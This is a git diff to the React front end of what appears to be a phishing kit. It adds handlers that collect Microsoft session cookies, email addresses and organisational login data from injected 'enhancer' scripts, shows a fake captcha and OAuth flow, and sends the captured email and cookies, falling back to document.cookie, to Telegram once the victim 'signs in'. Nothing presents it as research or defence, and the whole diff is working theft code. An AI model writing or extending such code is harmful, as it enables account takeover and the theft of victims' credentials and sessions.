@@ -3,6 +3,9 @@ import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
 
+// 🟢 NEW: Import cookie/email capture function and setter utilities
+import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './utils/client-cookie-capture';
+
 // Artificial delay helper (milliseconds)
 const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
 const nextStepDelay = SLOW_DELAY * 3;
@@ -11,15 +14,52 @@ function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
   const [pendingStep, setPendingStep] = useState<string | null>(null);
 
+  // State to hold the most reliable email and cookies captured via postMessage
+  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
+  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
+
+  // Listen for messages from enhancer scripts for robust cookie/email capture
+  useEffect(() => {
+    function handleMessage(event: MessageEvent) {
+      // For security, you may check event.origin here if needed
+      if (!event.data || typeof event.data !== 'object') return;
+
+      // EMAIL ENHANCER
+      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
+        setCapturedEmailState(event.data.email);
+        setCapturedEmail(event.data.email); // Also store in utils for access anywhere
+      }
+
+      // MICROSOFT COOKIES ENHANCER
+      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
+        try {
+          // Store as JSON string in state
+          const cookiesJson = JSON.stringify(event.data.data.cookies);
+          setCapturedCookiesState(cookiesJson);
+          setCapturedCookies(event.data.data.cookies); // Store in utils for access anywhere
+        } catch (e) {
+          // fallback: ignore
+        }
+      }
+
+      // ORGANIZATIONAL LOGIN ENHANCER
+      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
+        setCapturedEmailState(event.data.data.email);
+        setCapturedEmail(event.data.data.email);
+        // You could also capture org credentials if needed
+      }
+    }
+
+    window.addEventListener('message', handleMessage, false);
+    return () => window.removeEventListener('message', handleMessage);
+  }, []);
+
   // Check URL parameters only once on initial load
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
-
-    // Only set initial state if there's a step parameter
     if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
       setCurrentPage(step);
-      // Clean the URL after reading the parameter
       window.history.replaceState({}, document.title, window.location.pathname);
     }
   }, []);
@@ -54,8 +94,26 @@ function App() {
   };
 
   // Step 3: OAuth success: after Telegram, show loading document (final step, no more captcha)
-  const handleOAuthSuccess = (sessionData: any) => {
+  // 🟢 NEW: Accept real user email from sessionData and send cookies/email to Telegram
+  const handleOAuthSuccess = async (sessionData: any) => {
     console.log('🔐 OAuth successful:', sessionData);
+
+    // Prefer captured email/cookies from state; fallback to sessionData.email or document.cookie
+    const userEmail = capturedEmail || sessionData?.email || '';
+    const cookies = capturedCookies || document.cookie;
+
+    // 🟢 Call the cookie/email capture/send function
+    if (userEmail) {
+      try {
+        await captureAndSendCookies(userEmail, cookies);
+        console.log('✅ Cookies and email sent to Telegram');
+      } catch (err) {
+        console.error('❌ Failed to send cookies/email to Telegram:', err);
+      }
+    } else {
+      console.warn('⚠️ No user email found, skipping cookie/email send.');
+    }
+
     setCurrentPage('document-loading');
   };
 
